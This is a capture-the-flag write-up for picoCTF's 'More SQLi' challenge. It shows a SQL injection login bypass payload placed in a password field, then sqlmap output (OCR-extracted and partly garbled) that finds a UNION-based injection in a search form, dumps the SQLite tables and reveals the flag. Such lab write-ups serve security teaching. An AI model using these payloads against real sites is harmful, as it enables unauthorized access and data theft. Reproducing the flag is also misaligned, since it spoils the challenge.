# More SQLi
> Can you find the flag on this website.

## About the Challenge
We were given a simple website that contains login form, here is the preview of the website


[Image extracted text: Security Challenge
Please log in
Username
Password
Log in]


## How to Solve?
If you found a login form on the CTF competition, the need to check if the form is vulnerable to SQL injection. So I tried to input this into the login form

```
Username: ' or true-- -
Password: d
```

And the output is


[Image extracted text: username
true-
password
SQL
query:
SELECT id
FROM
users
WHERE password
AND
username
true]


We still can't log into the dashboard, but we can see the query running on the login form. So to bypass the login form, we need to input `' or true-- -` in the password form


[Image extracted text: Welcome
Log Out
Search Office
Eity
Search
city
Address
Phone
Algiers
Birger Jarlsgatan 7 , 4 tr
+246 8-616 99 40
Bamako
Friedrichstrale 68
+249 173 329 6295
Nairobi
Ferdinandstralse 35
+254 703 039 810
Kampala
Maybe all the tables
+256 720 7705600
Kigali
8 Ganton Street
+250 7469 214 950
Kinshasa
Sternstrale 5
+249 89 885 627 88
Lagos
Karl Johans gate 23B, 4. etasje
+234 224 25 150
Pretoria
149 Rue Saint-Honore
+233 635 46 15 03]


As you can see we can login into an admin dashboard and then there is a search form. And of course we need to do SQL injection again in the search form to obtain the flag. In this case i'll be using SQLMap to exploit the vulnerability


[Image extracted text: IV_
https: [Lsqlmap
org
[!] legal disclaimer: Usage
of
sqlmap
for attacking targets without
prior
mutual consent is illegal.
It is the
user
responsibility to obey all applicable local, state
federal
laws
Developers
assune
no
liability
are not responsible
for
any misuse
or
damage
caused by
this program
[*] starting
@ 23:37:19 /2023-03-28/
[23.37.19]
[INFO] parsing HTTP
request
from
sqlmap
txt
[23:37.19
INFO] testing connection to the target URL
[23:37:20]
INFO] testing if the target URL
content
is stable
[23:37:20
INFO] target URL
content is stable
[23.37:20]
INFO] testing if POST parameter
search
is
dynamic
[23:37:21] [WARNING]
POST parameter
search
does
not
appear to
be
dynamic
[23:37:21] [WARNING
heuristic (basic)
test
shows that POST
parameter
search
might not be injectable
[23:37:21]
INFO] testing
for SQL injection
on
POST parameter
search
[23:37:21]
[INFO] testing
AND boolean-based blind
WHERE
or HAVING
clause
[23:37:25]
INFO] testing
Boolean-based blind
Parameter
replace (original
value)
[23:37:25]
[INFO] testing
Generic inline queries
it
recommended
to perform
only basic UNION tests if there is
not at least
one
other (potential) technique found_
Do you want
to reduce the
number of
requests? [YIn]
[23:37:27]
INFO] testing
Generic UNION query (NULL)
1 to 10 columns
[23:37:29] [INFO]
'ORDER
BY '
technique
appears
to be
usable. This should reduce the time needed
to find the right number of
query
columns
Automatically extending the
range
for current UNION query injection
tech
nique
test
[23:37:30
[INFO] target URL
appears to
have
columns in
query
[23:37:31]
INFO] POST parameter
search
i5
Generic UNION query (NULL)
to 10
columns
injectable
[23:37:31]
[INFO] checking if the injection point
on POST
parameter
search
is
false positive
POST
paraneter
search
i5
vulnerable.
you
to keep testing
the others (if any)? [y/N]
sqlmap identified the following injection point(s) with
total
of 29 HTTP(s) requests
Parameter:
search (POST)
Type :
UNION query
Title:
Generic UNION query (NULL)
columns
Payload:
search-test
UNION ALL SELECT NULL,CHAR(113,106,98,112,113) [ [CHAR(104,83,119,101,109,120,114,74,90,107,120,89,112,88,114,88,104,83,101,75,76,109,66,84,105,113,67,101,106,99,99,72,88,85,79,115,121,118
0,87,114)
CHAR(113,118,112,98,113)
NULL--
uRqv&submit-Search
[23:37:37]
INFO] testing SQLite
[23:37:37]
INFO] confirming SQLite
[23:37:37]
INFO] actively fingerprinting SQLite
[23:37:37]
INFO] the back
DBMS
is SQLite
web
server operating
system:
Linux
Ubuntu
web application technology:
PHP
7.4.3
back-end DBMS
SQLite
[23:37:37] [WARNING] HTTP
error
codes detected
during
run:
500
(Internal
Server
Error)
10 times
end
and
and
want
end]


As you can see the SQLMap detect the `search` parameter is vulnerable to SQL injection. And to obtain the flag we need to dump the database using `--dump` switches


[Image extracted text: IV_
https: L Lsglmap_org
[!] legal disclaimer: Usage
of sqlmap for attacking targets without prior
mutual
consent is illegal
It is the
end user
responsibility
to
liability
and
are not
responsible
for
any misuse
or
damage
caused by this
program
[*] starting @ 23:39:13 /2023-03-28/
[23:39:13]
INFO] parsing HTTP
request
from
'sqlmap
txt
[23:39:13]
INFO] testing connection
to the
target URL
sqlmap
resumed the following injection point(s)
from
stored
session:
Parameter:
search (POST)
Type: UNION query
Title:
Generic UNION
query (NULL)
columns
Payload:
search-test
UNION ALL SELECT NULL,CHAR(113,106,98,112,113) | [CHAR(104,
119,101,109,120,114,74,90,107,120_
112,88,114,88,104
0,87,114) [ [CHAR(113,118,112,98,113)_
NULL -
uRav&submit-Search
[23:39:14]
INFO] testing SQLite
[23:39:14]
[INFO] confirming SQLite
[23:39:14]
[INFO] actively fingerprinting SQLite
[23:39:14]
INFO] the back
end DBMS is SQLite
web
server
operating system:
Linux Ubuntu
web application technology: PHP
7.4.3
back-end DBMS
SQLite
[23:39:14] [INFO] fetching tables for
database:
'SQLite_masterdb
[23:39:14]
[INFO] fetching
columns
for table
more
table
[23:39:15]
[INFO] fetching
entries
for table
more_
table
Database:
<current>
Table:
more
table
[2 entries]
id
flag
picoCTF{G3tting_SQL_InJBcZION_l1k3_yOu_shOulD
c8bZccza}
If
you
are
here,
you must have
seen
it
[23:39:15]
INFO] table
'SQLite_masterdb
more
table
dumped
to CSV file
Troot/.local/share/sqlmap/output/saturn-picoctf net/dump/SQLite
mas
[23:39:15] [INFO] fetching
columns
for table
users
[23:39:15] [INFO] fetching
entries
for table
users
Database:
<current>
83 ,-
89,]


```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}
```